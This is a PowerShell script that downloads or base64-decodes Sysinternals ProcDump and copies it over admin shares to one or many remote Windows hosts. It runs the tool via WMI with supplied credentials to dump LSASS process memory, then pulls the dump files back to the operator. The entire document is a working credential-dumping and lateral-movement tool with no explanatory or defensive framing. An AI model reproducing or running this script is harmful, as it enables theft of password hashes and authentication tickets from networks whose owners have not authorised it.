param(
    [parameter(ValueFromPipeline=$true)][string[]]$Target,
    [string]$Username,
    [string]$Domain=".",
    [string]$PasswordStr,
    [PSCredential]$Credential,
    [string]$Hostfile,
    [string]$ExecFile="https://live.sysinternals.com/procdump64.xxx.exe",
    [string]$ExecParams="-accepteula -64 -ma lsass.exe",
    [string]$DumpFile="lsass-{0}.dmp",
    [string]$LocalPath=$pwd,
    [string]$RemoteShare="C$\Temp",
    [string]$RemotePath="C:\Temp",
    [string]$ProcDumpBase64=""
)

Begin {
write-host "hello"
    $ExecFileName = Split-Path $ExecFile -Leaf

    If ($ExecFile -match "\Ahttps?://") {
        $URL = $ExecFile
        $ExecFile = @($LocalPath,$ExecFileName) -join "\"

        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $WebReq = Invoke-WebRequest -Uri $URL -OutFile "$ExecFile" -Method Get
    }

    If ($ExecFile) {
        If (-not (Test-Path $ExecFile) -and $ProcDumpBase64) {
            $ExecBytes = [Convert]::FromBase64String($ProcDumpBase64)
            $ExecBytes | Set-Content -Path $ExecFile -Encoding Byte
        }
    }

    If (-not $Credential -and $Username) {
        If ($Username -notmatch "[\\@]") { $Username = @($domain,$username) -join "\" }
        $Credential = New-Object PSCredential -ArgumentList @($Username,(ConvertTo-SecureString -String $PasswordStr -AsPlainText -Force))
    }

}

Process {

    Function DumpLSASS() {
    Write-host "Dumping $Target..."
        $RemoteSharePath =  @("\\$Target",$RemoteShare) -join "\"
        If (-not (Test-Path $RemoteSharePath )) { write-host "Creating folder [$REmoteSHarePath]..."; mkdir $RemoteSharePath }
        $SharePath = @($RemoteSharePath,$ExecFileName) -join "\"
        Write-host "copying from $ExecFile to $sharepath..."
        Copy-Item $ExecFile $SharePath
        $DumpFileName = $DumpFile -f $Target
        $TargetDumpFile = @($RemotePath,$DumpFileName) -join "\"
        $ArgumentList = @("cmd.exe /c ",$ExecFile,$ExecParams,$TargetDumpFile) -join " "
        write-host "Args: $ArgumentList"
        $MethodResult = Invoke-WmiMethod -Path win32_process -Name create -ArgumentList $ArgumentList -ComputerName $Target -Credential $Credential

        $waits=0
        while ( ($waits -le 5) -and (-not (Test-Path "$RemoteSharePath\$DumpFileName" -ErrorAction SilentlyContinue) ) ) {
            $waits++
            Start-Sleep -Seconds 3
        } 

        write-host "Copying from $RemoteSharePath\$DumpFileName to $LocalPath...?"
        Copy-Item "$RemoteSharePath\$DumpFileName" $LocalPath
    }

    If ($Target) { 
        DumpLSASS
    } elseif ($Hostfile) {
        ForEach ($Target in (Get-Content $Hostfile)) {
            DumpLSASS
        }
    }

}

End {

}